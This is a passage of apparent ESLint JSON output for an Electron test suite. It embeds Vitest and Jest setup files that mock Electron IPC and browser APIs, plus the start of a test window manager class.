following 2025 best practices for:\n * - React Testing Library with Electron integration\n * - Modern jsdom/happy-dom environment setup\n * - Electron contextBridge API mocking\n * - Performance monitoring and memory tracking\n */\n\nimport { vi, beforeEach, afterEach, expect } from 'vitest'\nimport { cleanup } from '@testing-library/react'\nimport { configure } from '@testing-library/react'\nimport '@testing-library/jest-dom'\n\n// Import Zustand mock and resetAllStores directly\nimport { resetAllStores } from '../../__mocks__/zustand'\n\n// Configure React Testing Library for optimal performance and debugging\nconfigure({\n  testIdAttribute: 'data-testid',\n  // Increase async timeout for slower CI environments\n  asyncUtilTimeout: 10000,\n  // Better error messages for failed queries\n  getElementError: (message, container) => {\n    const error = new Error(message)\n    error.name = 'TestingLibraryElementError'\n    error.stack = null\n    return error\n  }\n})\n\n// Mock the contextBridge API exposed to renderer process\nconst mockElectronAPI = {\n  // IPC Communication\n  invoke: vi.fn().mockImplementation((channel: string, ...args: any[]) => {\n    // Mock common IPC responses based on channel\n    switch (channel) {\n      case 'app:get-version':\n        return Promise.resolve('1.0.0-test')\n      case 'app:get-platform':\n        return Promise.resolve('darwin')\n      case 'dialog:show-open':\n        return Promise.resolve({ \n          canceled: false, \n          filePaths: ['/mock/test.json'] \n        })\n      case 'tasks:get-all':\n        return Promise.resolve([])\n      case 'tasks:save':\n        return Promise.resolve(true)\n      case 'window:minimize':\n        return Promise.resolve()\n      case 'window:close':\n        return Promise.resolve()\n      default:\n        return Promise.resolve(null)\n    }\n  }),\n  \n  on: vi.fn().mockImplementation((channel: string, callback: Function) => {\n    // Store listeners for potential cleanup\n    if (!global.mockIPCListeners) {\n      global.mockIPCListeners = new Map()\n    }\n    \n    if (!global.mockIPCListeners.has(channel)) {\n      global.mockIPCListeners.set(channel, [])\n    }\n    \n    global.mockIPCListeners.get(channel)!.push(callback)\n    \n    // Return cleanup function\n    return () => {\n      const listeners = global.mockIPCListeners.get(channel) || []\n      const index = listeners.indexOf(callback)\n      if (index > -1) {\n        listeners.splice(index, 1)\n      }\n    }\n  }),\n  \n  off: vi.fn().mockImplementation((channel: string, callback?: Function) => {\n    if (!global.mockIPCListeners) return\n    \n    if (callback) {\n      const listeners = global.mockIPCListeners.get(channel) || []\n      const index = listeners.indexOf(callback)\n      if (index > -1) {\n        listeners.splice(index, 1)\n      }\n    } else {\n      global.mockIPCListeners.delete(channel)\n    }\n  }),\n  \n  send: vi.fn(),\n  \n  // File system operations\n  showOpenDialog: vi.fn().mockResolvedValue({\n    canceled: false,\n    filePaths: ['/mock/selected/file.json']\n  }),\n  \n  showSaveDialog: vi.fn().mockResolvedValue({\n    canceled: false,\n    filePath: '/mock/save/location.json'\n  }),\n  \n  readFile: vi.fn().mockResolvedValue('{\"tasks\": []}'),\n  writeFile: vi.fn().mockResolvedValue(true),\n  \n  // Window operations\n  minimize: vi.fn().mockResolvedValue(undefined),\n  maximize: vi.fn().mockResolvedValue(undefined),\n  close: vi.fn().mockResolvedValue(undefined),\n  \n  // App information\n  getVersion: vi.fn().mockResolvedValue('1.0.0-test'),\n  getPlatform: vi.fn().mockResolvedValue('darwin'),\n  \n  // Development tools\n  openDevTools: vi.fn().mockResolvedValue(undefined),\n  \n  // Security validation\n  validateOrigin: vi.fn().mockReturnValue(true),\n  \n  // Theme management\n  getTheme: vi.fn().mockResolvedValue('light'),\n  setTheme: vi.fn().mockResolvedValue(undefined),\n  \n  // Notifications\n  showNotification: vi.fn().mockResolvedValue(undefined),\n  \n  // Analytics and telemetry (for testing)\n  trackEvent: vi.fn().mockResolvedValue(undefined),\n  \n  // Performance monitoring\n  getPerformanceMetrics: vi.fn().mockResolvedValue({\n    memory: { used: 1024 * 1024 * 50, total: 1024 * 1024 * 100 },\n    cpu: { usage: 15.5 }\n  })\n}\n\n// Expose Electron API to renderer process (simulating contextBridge)\nObject.defineProperty(window, 'electronAPI', {\n  writable: true,\n  value: mockElectronAPI\n})\n\n// Also expose under legacy 'electron' namespace for backward compatibility\nObject.defineProperty(window, 'electron', {\n  writable: true,\n  value: mockElectronAPI\n})\n\n// Mock common web APIs that might not be available in test environment\nObject.defineProperty(window, 'matchMedia', {\n  writable: true,\n  value: vi.fn().mockImplementation(query => ({\n    matches: false,\n    media: query,\n    onchange: null,\n    addListener: vi.fn(), // deprecated\n    removeListener: vi.fn(), // deprecated\n    addEventListener: vi.fn(),\n    removeEventListener: vi.fn(),\n    dispatchEvent: vi.fn(),\n  })),\n})\n\n// Mock IntersectionObserver for virtual scrolling components\nObject.defineProperty(window, 'IntersectionObserver', {\n  writable: true,\n  value: vi.fn().mockImplementation(() => ({\n    observe: vi.fn(),\n    unobserve: vi.fn(),\n    disconnect: vi.fn(),\n  })),\n})\n\nObject.defineProperty(global, 'IntersectionObserver', {\n  writable: true,\n  value: window.IntersectionObserver,\n})\n\n// Mock ResizeObserver for responsive components\nObject.defineProperty(window, 'ResizeObserver', {\n  writable: true,\n  value: vi.fn().mockImplementation(() => ({\n    observe: vi.fn(),\n    unobserve: vi.fn(),\n    disconnect: vi.fn(),\n  })),\n})\n\n// Mock requestAnimationFrame for animations\nObject.defineProperty(window, 'requestAnimationFrame', {\n  writable: true,\n  value: vi.fn().mockImplementation((callback: FrameRequestCallback) => {\n    return setTimeout(() => callback(Date.now()), 16)\n  }),\n})\n\nObject.defineProperty(window, 'cancelAnimationFrame', {\n  writable: true,\n  value: vi.fn().mockImplementation((id: number) => {\n    clearTimeout(id)\n  }),\n})\n\n// Mock fetch for network requests\nglobal.fetch = vi.fn().mockImplementation(() =>\n  Promise.resolve({\n    ok: true,\n    status: 200,\n    json: () => Promise.resolve({}),\n    text: () => Promise.resolve(''),\n    blob: () => Promise.resolve(new Blob()),\n    arrayBuffer: () => Promise.resolve(new ArrayBuffer(0)),\n  })\n)\n\n// Mock URL.createObjectURL and revokeObjectURL\nObject.defineProperty(URL, 'createObjectURL', {\n  writable: true,\n  value: vi.fn().mockReturnValue('mock-object-url'),\n})\n\nObject.defineProperty(URL, 'revokeObjectURL', {\n  writable: true,\n  value: vi.fn(),\n})\n\n// Mock clipboard API\nObject.defineProperty(navigator, 'clipboard', {\n  writable: true,\n  configurable: true,\n  value: {\n    writeText: vi.fn().mockResolvedValue(undefined),\n    readText: vi.fn().mockResolvedValue('mock clipboard text'),\n  },\n})\n\n// Enhanced error boundary testing support\nwindow.addEventListener('error', (event) => {\n  console.error('Uncaught error in test:', event.error)\n})\n\nwindow.addEventListener('unhandledrejection', (event) => {\n  console.error('Unhandled promise rejection in test:', event.reason)\n})\n\n// Performance tracking for renderer tests\nlet renderStartTime: number\n\n// Global test setup and teardown\nbeforeEach(() => {\n  // Clear all mocks before each test\n  vi.clearAllMocks()\n  \n  // Clear IPC listeners\n  global.mockIPCListeners?.clear()\n  \n  // Reset mock implementations to default state\n  mockElectronAPI.invoke.mockImplementation((channel: string, ...args: any[]) => {\n    switch (channel) {\n      case 'app:get-version':\n        return Promise.resolve('1.0.0-test')\n      case 'app:get-platform':\n        return Promise.resolve('darwin')\n      case 'tasks:get-all':\n        return Promise.resolve([])\n      default:\n        return Promise.resolve(null)\n    }\n  })\n  \n  // Reset Zustand stores for test isolation\n  try {\n    resetAllStores()\n  } catch (error) {\n    // Fail silently if Zustand mock not available\n    console.warn('Zustand mock not available for store reset:', error.message)\n  }\n  \n  // Track render performance\n  renderStartTime = performance.now()\n  \n  // Clear localStorage and sessionStorage\n  window.localStorage.clear()\n  window.sessionStorage.clear()\n})\n\nafterEach(() => {\n  // Clean up React Testing Library\n  cleanup()\n  \n  // Clean up any remaining listeners\n  global.mockIPCListeners?.clear()\n  \n  // Log slow tests (threshold: 1000ms)\n  const renderTime = performance.now() - renderStartTime\n  if (renderTime > 1000) {\n    console.warn(`Slow test detected: ${Math.round(renderTime)}ms render time`)\n  }\n  \n  // Reset timers\n  vi.useRealTimers()\n  \n  // Clean up any remaining DOM event listeners\n  document.body.innerHTML = ''\n})\n\n// Utility functions for tests\nexport const mockIPCResponse = (channel: string, response: any) => {\n  mockElectronAPI.invoke.mockImplementation((ch: string, ...args: any[]) => {\n    if (ch === channel) {\n      return Promise.resolve(response)\n    }\n    return Promise.resolve(null)\n  })\n}\n\nexport const triggerIPCEvent = (channel: string, ...args: any[]) => {\n  const listeners = global.mockIPCListeners?.get(channel) || []\n  listeners.forEach(callback => callback(...args))\n}\n\nexport const waitForIPCCall = (channel: string, timeout = 5000) => {\n  return new Promise((resolve, reject) => {\n    const timer = setTimeout(() => {\n      reject(new Error(`IPC call to ${channel} not received within ${timeout}ms`))\n    }, timeout)\n    \n    const originalInvoke = mockElectronAPI.invoke\n    mockElectronAPI.invoke.mockImplementation((ch: string, ...args: any[]) => {\n      if (ch === channel) {\n        clearTimeout(timer)\n        resolve(args)\n      }\n      return originalInvoke(ch, ...args)\n    })\n  })\n}\n\n// Extend expect with custom matchers for Electron testing\nexpect.extend({\n  toHaveBeenCalledWithIPC(received, channel, ...args) {\n    const pass = received.mock.calls.some(call => \n      call[0] === channel && \n      args.every((arg, index) => call[index + 1] === arg)\n    )\n    \n    if (pass) {\n      return {\n        message: () => `Expected ${received.getMockName()} not to have been called with IPC channel \"${channel}\"`,\n        pass: true,\n      }\n    } else {\n      return {\n        message: () => `Expected ${received.getMockName()} to have been called with IPC channel \"${channel}\"`,\n        pass: false,\n      }\n    }\n  },\n})\n\n// Type declarations for global additions\ndeclare global {\n  interface Window {\n    electronAPI: typeof mockElectronAPI\n    electron: typeof mockElectronAPI\n  }\n  \n  var mockIPCListeners: Map<string, Function[]>\n  \n  namespace Vi {\n    interface JestAssertion<T = any> {\n      toHaveBeenCalledWithIPC(channel: string, ...args: any[]): T\n    }\n  }\n}\n\nexport { mockElectronAPI }","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/setup/unit-tests.setup.ts","messages":[{"ruleId":"no-var","severity":2,"message":"Unexpected var, use let or const instead.","line":222,"column":3,"nodeType":"VariableDeclaration","messageId":"unexpectedVar","endLine":222,"endColumn":42},{"ruleId":"no-var","severity":2,"message":"Unexpected var, use let or const instead.","line":223,"column":3,"nodeType":"VariableDeclaration","messageId":"unexpectedVar","endLine":231,"endColumn":4},{"ruleId":"@typescript-eslint/no-namespace","severity":2,"message":"ES2015 module syntax is preferred over namespaces.","line":233,"column":3,"nodeType":"TSModuleDeclaration","messageId":"moduleSyntaxIsPreferred","endLine":238,"endColumn":4}],"suppressedMessages":[],"errorCount":3,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Unit Tests Setup Configuration (2025)\n * \n * Global setup for unit tests following 2025 best practices:\n * - Enhanced error handling and debugging\n * - Mock configuration for Electron APIs\n * - Performance monitoring setup\n * - Memory leak detection configuration\n */\n\nimport { jest } from '@jest/globals'\n\n// Global test timeout\njest.setTimeout(30000)\n\n// Mock Electron APIs for unit testing\nconst mockElectronAPI = {\n  ipcRenderer: {\n    invoke: jest.fn(),\n    on: jest.fn(),\n    off: jest.fn(),\n    send: jest.fn(),\n    removeAllListeners: jest.fn()\n  },\n  app: {\n    getVersion: jest.fn(() => '1.0.0'),\n    getName: jest.fn(() => 'TaskMaster'),\n    getPath: jest.fn(() => '/mock/path'),\n    quit: jest.fn()\n  },\n  dialog: {\n    showOpenDialog: jest.fn(),\n    showSaveDialog: jest.fn(),\n    showMessageBox: jest.fn()\n  },\n  shell: {\n    openExternal: jest.fn(),\n    showItemInFolder: jest.fn()\n  }\n}\n\n// Global mocks\nglobal.electronAPI = mockElectronAPI\n\n// Mock localStorage for renderer tests\nconst localStorageMock = {\n  getItem: jest.fn(),\n  setItem: jest.fn(),\n  removeItem: jest.fn(),\n  clear: jest.fn()\n}\nObject.defineProperty(window, 'localStorage', {\n  value: localStorageMock\n})\n\n// Mock sessionStorage\nconst sessionStorageMock = {\n  getItem: jest.fn(),\n  setItem: jest.fn(),\n  removeItem: jest.fn(),\n  clear: jest.fn()\n}\nObject.defineProperty(window, 'sessionStorage', {\n  value: sessionStorageMock\n})\n\n// Mock ResizeObserver\nglobal.ResizeObserver = jest.fn().mockImplementation(() => ({\n  observe: jest.fn(),\n  unobserve: jest.fn(),\n  disconnect: jest.fn()\n}))\n\n// Mock IntersectionObserver\nglobal.IntersectionObserver = jest.fn().mockImplementation(() => ({\n  observe: jest.fn(),\n  unobserve: jest.fn(),\n  disconnect: jest.fn()\n}))\n\n// Mock requestAnimationFrame\nglobal.requestAnimationFrame = jest.fn((cb) => setTimeout(cb, 16))\nglobal.cancelAnimationFrame = jest.fn()\n\n// Console override for cleaner test output\nconst originalConsoleError = console.error\nconst originalConsoleWarn = console.warn\n\nbeforeAll(() => {\n  // Suppress expected warnings in tests\n  console.error = (...args: any[]) => {\n    if (\n      args[0]?.includes?.('Warning: ReactDOM.render is no longer supported') ||\n      args[0]?.includes?.('Warning: componentWillReceiveProps')\n    ) {\n      return\n    }\n    originalConsoleError(...args)\n  }\n  \n  console.warn = (...args: any[]) => {\n    if (args[0]?.includes?.('Warning:')) {\n      return\n    }\n    originalConsoleWarn(...args)\n  }\n})\n\nafterAll(() => {\n  console.error = originalConsoleError\n  console.warn = originalConsoleWarn\n})\n\n// Global test utilities\nglobal.testUtils = {\n  // Wait for next tick\n  waitForNextTick: () => new Promise(resolve => setTimeout(resolve, 0)),\n  \n  // Wait for condition\n  waitFor: async (condition: () => boolean, timeout = 5000) => {\n    const start = Date.now()\n    while (!condition() && Date.now() - start < timeout) {\n      await new Promise(resolve => setTimeout(resolve, 50))\n    }\n    if (!condition()) {\n      throw new Error(`Condition not met within ${timeout}ms`)\n    }\n  },\n  \n  // Mock timer helpers\n  advanceTimers: (ms: number) => {\n    jest.advanceTimersByTime(ms)\n  },\n  \n  // Memory usage helpers\n  getMemoryUsage: () => process.memoryUsage(),\n  \n  // Performance measurement\n  measurePerformance: <T>(fn: () => T | Promise<T>) => {\n    const start = performance.now()\n    const result = fn()\n    if (result instanceof Promise) {\n      return result.then(value => ({\n        result: value,\n        duration: performance.now() - start\n      }))\n    }\n    return {\n      result,\n      duration: performance.now() - start\n    }\n  }\n}\n\n// Performance monitoring for tests\nlet testStartTime: number\nlet testMemoryStart: NodeJS.MemoryUsage\n\nbeforeEach(() => {\n  testStartTime = performance.now()\n  testMemoryStart = process.memoryUsage()\n  \n  // Reset all mocks\n  jest.clearAllMocks()\n})\n\nafterEach(() => {\n  const testDuration = performance.now() - testStartTime\n  const testMemoryEnd = process.memoryUsage()\n  const memoryDelta = testMemoryEnd.heapUsed - testMemoryStart.heapUsed\n  \n  // Log performance metrics for slow tests\n  if (testDuration > 1000) {\n    console.warn(`âš ï¸ Slow test detected: ${testDuration.toFixed(2)}ms`)\n  }\n  \n  // Log memory usage for memory-intensive tests\n  if (memoryDelta > 10 * 1024 * 1024) { // 10MB\n    console.warn(`âš ï¸ High memory usage: ${(memoryDelta / 1024 / 1024).toFixed(2)}MB`)\n  }\n})\n\n// Error boundary for tests\nprocess.on('unhandledRejection', (reason, promise) => {\n  console.error('Unhandled Rejection at:', promise, 'reason:', reason)\n})\n\nprocess.on('uncaughtException', (error) => {\n  console.error('Uncaught Exception:', error)\n})\n\n// Enhanced expect matchers\nexpect.extend({\n  toBeWithinRange(received: number, floor: number, ceiling: number) {\n    const pass = received >= floor && received <= ceiling\n    if (pass) {\n      return {\n        message: () => `expected ${received} not to be within range ${floor} - ${ceiling}`,\n        pass: true\n      }\n    } else {\n      return {\n        message: () => `expected ${received} to be within range ${floor} - ${ceiling}`,\n        pass: false\n      }\n    }\n  },\n  \n  toHaveBeenCalledWithAsync(received: jest.MockedFunction<any>, ...expectedArgs: any[]) {\n    return {\n      message: () => `expected function to have been called with ${JSON.stringify(expectedArgs)}`,\n      pass: received.mock.calls.some(call => \n        call.length === expectedArgs.length &&\n        call.every((arg, index) => JSON.stringify(arg) === JSON.stringify(expectedArgs[index]))\n      )\n    }\n  }\n})\n\n// Type declarations for global utilities\ndeclare global {\n  var electronAPI: typeof mockElectronAPI\n  var testUtils: {\n    waitForNextTick: () => Promise<void>\n    waitFor: (condition: () => boolean, timeout?: number) => Promise<void>\n    advanceTimers: (ms: number) => void\n    getMemoryUsage: () => NodeJS.MemoryUsage\n    measurePerformance: <T>(fn: () => T | Promise<T>) => T extends Promise<infer U> \n      ? Promise<{ result: U; duration: number }> \n      : { result: T; duration: number }\n  }\n  \n  namespace jest {\n    interface Matchers<R> {\n      toBeWithinRange(floor: number, ceiling: number): R\n      toHaveBeenCalledWithAsync(...args: any[]): R\n    }\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/unit-tests.setup.ts","messages":[{"ruleId":"@typescript-eslint/no-namespace","severity":2,"message":"ES2015 module syntax is preferred over namespaces.","line":233,"column":3,"nodeType":"TSModuleDeclaration","messageId":"moduleSyntaxIsPreferred","endLine":238,"endColumn":4}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Unit Tests Setup Configuration (2025)\n * \n * Global setup for unit tests following 2025 best practices:\n * - Enhanced error handling and debugging\n * - Mock configuration for Electron APIs\n * - Performance monitoring setup\n * - Memory leak detection configuration\n */\n\nimport { jest } from '@jest/globals'\n\n// Global test timeout\njest.setTimeout(30000)\n\n// Mock Electron APIs for unit testing\nconst mockElectronAPI = {\n  ipcRenderer: {\n    invoke: jest.fn(),\n    on: jest.fn(),\n    off: jest.fn(),\n    send: jest.fn(),\n    removeAllListeners: jest.fn()\n  },\n  app: {\n    getVersion: jest.fn(() => '1.0.0'),\n    getName: jest.fn(() => 'TaskMaster'),\n    getPath: jest.fn(() => '/mock/path'),\n    quit: jest.fn()\n  },\n  dialog: {\n    showOpenDialog: jest.fn(),\n    showSaveDialog: jest.fn(),\n    showMessageBox: jest.fn()\n  },\n  shell: {\n    openExternal: jest.fn(),\n    showItemInFolder: jest.fn()\n  }\n}\n\n// Global mocks\nglobal.electronAPI = mockElectronAPI\n\n// Mock localStorage for renderer tests\nconst localStorageMock = {\n  getItem: jest.fn(),\n  setItem: jest.fn(),\n  removeItem: jest.fn(),\n  clear: jest.fn()\n}\nObject.defineProperty(window, 'localStorage', {\n  value: localStorageMock\n})\n\n// Mock sessionStorage\nconst sessionStorageMock = {\n  getItem: jest.fn(),\n  setItem: jest.fn(),\n  removeItem: jest.fn(),\n  clear: jest.fn()\n}\nObject.defineProperty(window, 'sessionStorage', {\n  value: sessionStorageMock\n})\n\n// Mock ResizeObserver\nglobal.ResizeObserver = jest.fn().mockImplementation(() => ({\n  observe: jest.fn(),\n  unobserve: jest.fn(),\n  disconnect: jest.fn()\n}))\n\n// Mock IntersectionObserver\nglobal.IntersectionObserver = jest.fn().mockImplementation(() => ({\n  observe: jest.fn(),\n  unobserve: jest.fn(),\n  disconnect: jest.fn()\n}))\n\n// Mock requestAnimationFrame\nglobal.requestAnimationFrame = jest.fn((cb) => setTimeout(cb, 16))\nglobal.cancelAnimationFrame = jest.fn()\n\n// Console override for cleaner test output\nconst originalConsoleError = console.error\nconst originalConsoleWarn = console.warn\n\nbeforeAll(() => {\n  // Suppress expected warnings in tests\n  console.error = (...args: any[]) => {\n    if (\n      args[0]?.includes?.('Warning: ReactDOM.render is no longer supported') ||\n      args[0]?.includes?.('Warning: componentWillReceiveProps')\n    ) {\n      return\n    }\n    originalConsoleError(...args)\n  }\n  \n  console.warn = (...args: any[]) => {\n    if (args[0]?.includes?.('Warning:')) {\n      return\n    }\n    originalConsoleWarn(...args)\n  }\n})\n\nafterAll(() => {\n  console.error = originalConsoleError\n  console.warn = originalConsoleWarn\n})\n\n// Global test utilities\nglobal.testUtils = {\n  // Wait for next tick\n  waitForNextTick: () => new Promise(resolve => setTimeout(resolve, 0)),\n  \n  // Wait for condition\n  waitFor: async (condition: () => boolean, timeout = 5000) => {\n    const start = Date.now()\n    while (!condition() && Date.now() - start < timeout) {\n      await new Promise(resolve => setTimeout(resolve, 50))\n    }\n    if (!condition()) {\n      throw new Error(`Condition not met within ${timeout}ms`)\n    }\n  },\n  \n  // Mock timer helpers\n  advanceTimers: (ms: number) => {\n    jest.advanceTimersByTime(ms)\n  },\n  \n  // Memory usage helpers\n  getMemoryUsage: () => process.memoryUsage(),\n  \n  // Performance measurement\n  measurePerformance: <T>(fn: () => T | Promise<T>) => {\n    const start = performance.now()\n    const result = fn()\n    if (result instanceof Promise) {\n      return result.then(value => ({\n        result: value,\n        duration: performance.now() - start\n      }))\n    }\n    return {\n      result,\n      duration: performance.now() - start\n    }\n  }\n}\n\n// Performance monitoring for tests\nlet testStartTime: number\nlet testMemoryStart: NodeJS.MemoryUsage\n\nbeforeEach(() => {\n  testStartTime = performance.now()\n  testMemoryStart = process.memoryUsage()\n  \n  // Reset all mocks\n  jest.clearAllMocks()\n})\n\nafterEach(() => {\n  const testDuration = performance.now() - testStartTime\n  const testMemoryEnd = process.memoryUsage()\n  const memoryDelta = testMemoryEnd.heapUsed - testMemoryStart.heapUsed\n  \n  // Log performance metrics for slow tests\n  if (testDuration > 1000) {\n    console.warn(`âš ï¸ Slow test detected: ${testDuration.toFixed(2)}ms`)\n  }\n  \n  // Log memory usage for memory-intensive tests\n  if (memoryDelta > 10 * 1024 * 1024) { // 10MB\n    console.warn(`âš ï¸ High memory usage: ${(memoryDelta / 1024 / 1024).toFixed(2)}MB`)\n  }\n})\n\n// Error boundary for tests\nprocess.on('unhandledRejection', (reason, promise) => {\n  console.error('Unhandled Rejection at:', promise, 'reason:', reason)\n})\n\nprocess.on('uncaughtException', (error) => {\n  console.error('Uncaught Exception:', error)\n})\n\n// Enhanced expect matchers\nexpect.extend({\n  toBeWithinRange(received: number, floor: number, ceiling: number) {\n    const pass = received >= floor && received <= ceiling\n    if (pass) {\n      return {\n        message: () => `expected ${received} not to be within range ${floor} - ${ceiling}`,\n        pass: true\n      }\n    } else {\n      return {\n        message: () => `expected ${received} to be within range ${floor} - ${ceiling}`,\n        pass: false\n      }\n    }\n  },\n  \n  toHaveBeenCalledWithAsync(received: jest.MockedFunction<any>, ...expectedArgs: any[]) {\n    return {\n      message: () => `expected function to have been called with ${JSON.stringify(expectedArgs)}`,\n      pass: received.mock.calls.some(call => \n        call.length === expectedArgs.length &&\n        call.every((arg, index) => JSON.stringify(arg) === JSON.stringify(expectedArgs[index]))\n      )\n    }\n  }\n})\n\n// Type declarations for global utilities\ndeclare global {\n  let electronAPI: typeof mockElectronAPI\n  let testUtils: {\n    waitForNextTick: () => Promise<void>\n    waitFor: (condition: () => boolean, timeout?: number) => Promise<void>\n    advanceTimers: (ms: number) => void\n    getMemoryUsage: () => NodeJS.MemoryUsage\n    measurePerformance: <T>(fn: () => T | Promise<T>) => T extends Promise<infer U> \n      ? Promise<{ result: U; duration: number }> \n      : { result: T; duration: number }\n  }\n  \n  namespace jest {\n    interface Matchers<R> {\n      toBeWithinRange(floor: number, ceiling: number): R\n      toHaveBeenCalledWithAsync(...args: any[]): R\n    }\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/electron-test-helper.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/failsafe-cleanup.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/memory-test-utils.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/performance-benchmark.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/test-helpers.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/utils/electron-test-helper.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/utils/failsafe-cleanup.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/utils/memory-test-utils.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/utils/performance-benchmark.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/utils/test-helpers.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/utils/window-manager.ts","messages":[{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":18,"column":26,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":18,"endColumn":34},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":321,"column":15,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":321,"endColumn":23}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Test Window Manager for Electron Testing (2025)\n * \n * Centralized window management utility implementing best practices for\n * Electron window lifecycle management during testing. Provides comprehensive\n * tracking, cleanup, and safety features following 2025 security standards.\n */\n\nimport { BrowserWindow, app, BrowserWindowConstructorOptions } from 'electron'\nimport { EventEmitter } from 'events'\n\n// Window tracking types\ninterface TrackedWindow {\n  id: string\n  window: BrowserWindow\n  createdAt: Date\n  timeout?: NodeJS.Timeout\n  listeners: Map<string, Function>\n  metadata?: Record<string, any>\n}\n\ninterface WindowManagerOptions {\n  defaultTimeout?: number // Auto-destroy timeout in ms\n  maxWindows?: number // Maximum concurrent windows\n  showWindows?: boolean // Whether to show windows during tests\n  enableLogging?: boolean // Enable detailed logging\n}\n\ninterface WindowCreationOptions extends BrowserWindowConstructorOptions {\n  id?: string // Custom ID for the window\n  timeout?: number // Override default timeout\n  metadata?: Record<string, any> // Custom metadata\n}\n\n// Memory tracking utilities\nexport class MemoryMonitor {\n  private samples: number[] = []\n  private maxSamples: number = 20\n  \n  public recordSample(): void {\n    const usage = process.memoryUsage().heapUsed\n    this.samples.push(usage)\n    \n    if (this.samples.length > this.maxSamples) {\n      this.samples.shift()\n    }\n  }\n  \n  public getAverageUsage(): number {\n    if (this.samples.length === 0) return 0\n    return this.samples.reduce((a, b) => a + b, 0) / this.samples.length\n  }\n  \n  public detectLeak(threshold: number = 0.1): boolean {\n    if (this.samples.length < 10) return false\n    \n    const firstHalf = this.samples.slice(0, 5).reduce((a, b) => a + b, 0) / 5\n    const lastHalf = this.samples.slice(-5).reduce((a, b) => a + b, 0) / 5\n    \n    const growthRate = (lastHalf - firstHalf) / firstHalf\n    return growthRate > threshold\n  }\n  \n  public reset(): void {\n    this.samples = []\n  }\n}\n\n/**\n * Comprehensive Test Window Manager\n * \n * Features:\n * - Automatic window tracking and cleanup\n * - Timeout protection\n * - Memory leak detection\n * - Event listener management\n * - Concurrent window limits\n * - Detailed logging\n * - Error recovery\n */\nexport class TestWindowManager extends EventEmitter {\n  private windows: Map<string, TrackedWindow> = new Map()\n  private cleanupHandlers: Set<() => void | Promise<void>> = new Set()\n  private memoryMonitor: MemoryMonitor = new MemoryMonitor()\n  private options: Required<WindowManagerOptions>\n  private isCleaningUp: boolean = false\n  private windowCounter: number = 0\n  \n  constructor(options: WindowManagerOptions = {}) {\n    super()\n    \n    this.options = {\n      defaultTimeout: options.defaultTimeout ?? 300000, // 5 minutes default\n      maxWindows: options.maxWindows ?? 10,\n      showWindows: options.showWindows ?? false,\n      enableLogging: options.enableLogging ?? false\n    }\n    \n    // Set up global cleanup handlers\n    this.setupGlobalHandlers()\n  }\n  \n  /**\n   * Creates a managed window with automatic tracking and cleanup\n   */\n  public createWindow(options: WindowCreationOptions = {}): BrowserWindow {\n    // Check window limit\n    if (this.windows.size >= this.options.maxWindows) {\n      throw new Error(`Maximum window limit (${this.options.maxWindows}) reached`)\n    }\n    \n    // Generate unique ID if not provided\n    const id = options.id || `window-${Date.now()}-${this.windowCounter++}`\n    \n    // Check for duplicate ID\n    if (this.windows.has(id)) {\n      throw new Error(`Window with id \"${id}\" already exists`)\n    }\n    \n    // Prepare window options\n    const windowOptions: BrowserWindowConstructorOptions = {\n      show: this.options.showWindows,\n      width: 800,\n      height: 600,\n      webPreferences: {\n        nodeIntegration: false,\n        contextIsolation: true,\n        webSecurity: true,\n        ...options.webPreferences\n      },\n      ...options\n    }\n    \n    // Remove custom 